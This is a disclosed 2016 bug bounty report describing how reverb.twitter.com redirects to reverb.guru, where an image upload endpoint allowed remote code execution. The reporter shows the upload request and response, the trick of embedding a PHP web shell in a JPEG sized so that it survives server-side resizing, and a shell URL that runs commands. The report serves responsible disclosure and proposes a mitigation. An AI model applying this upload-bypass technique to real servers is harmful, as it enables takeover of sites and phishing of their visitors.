# reverb.twitter.com redirects to vulnerable reverb.guru

## Report Details
- **Report ID**: 158148
- **URL**: https://hackerone.com/reports/158148
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2016-08-10T12:45:23.108Z
- **Disclosed**: 2016-10-01T01:08:57.986Z

## Reporter
- **Username**: theraz0r
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Hi!

http://reverb.twitter.com redirects requests to http://reverb.guru which hosts a vulnerable PHP application. I managed to get RCE there which allows to modify the contents of this site, so that reverb.twitter.com will redirect to a phishing page or force a malicious file download.

I was able to get RCE on reverb.guru the following way. By analyzing intercepted requests I discovered http://reverb.guru/api/actions/fileUpload.php. The script allows to upload images on the server (needs a valid Twitter auth):

```http
POST /api/actions/fileUpload.php HTTP/1.1
Host: reverb.guru
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-NewRelic-ID: UwYFUF5WGwcCUlNVAgk=
X-Requested-With: XMLHttpRequest
Referer: http://reverb.guru/authoring/
Cookie: _ga=GA1.2.1164992843.1470821302; _gat=1; PHPSESSID=ckdlhrcaioq3mnp4n68asvb3i3
Connection: close
Content-Type: multipart/form-data; boundary=--------541639189
Content-Length: 121

----------541639189
Content-Disposition: form-data; name="image_file"; filename="test.jpg"

IMAGE_DATA
----------541639189--
```

```http
HTTP/1.1 200 OK
Date: Wed, 10 Aug 2016 10:56:27 GMT
Server: Apache
X-NewRelic-App-Data: PxQAUVRSAAYTUFNUBQYCXkYdFGQHBDcQUQxLA1tMXV1dORY0QwhvTQVGXj1JAltHWQsPEWseUQ8IVGNDDgkCBh4SUBIaFAQcA1UJUQFNA0xUBgVTUU8VAhxGVwZWVAVfBQAPAwAEBQMDUxpOXllYQVY4
Content-Length: 57
Connection: close
Content-Type: application/json

{"image_path":"\/view\/data\/logos\/test_3922005924.jpg"}
```

The original extension is preserved, so to upload a web shell one needs just to use .php extension. However during the upload image is cropped to a 50x50 square, and the injected web shell is removed from the image. In order to deliver the web shell in the image, it is necessary to learn image quality after resizing. Luckily, uploaded image contains this information:

{F111074}

The next step is to generate a 50x50 jpeg image with 75% quality ratio and inject a web shell into it. There is a nice PoC that can generate such file for us: http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l

After our crafted jpeg has been uploaded, we can see that web shell survived resizing:

{F111077}

Now, switching to php extension it is possible execute arbitrary commands (http://reverb.guru/view/data/logos/test_4992504809.php?c=id ):

{F111078}

Suggested mitigation is to get rid of this redirect or the entire subdomain.

Thank you!

## Attachments
- Screenshot_from_2016-08-10_15_27_46.png
- Screenshot_from_2016-08-10_15_34_59.png
- Screenshot_from_2016-08-10_15_37_42.png
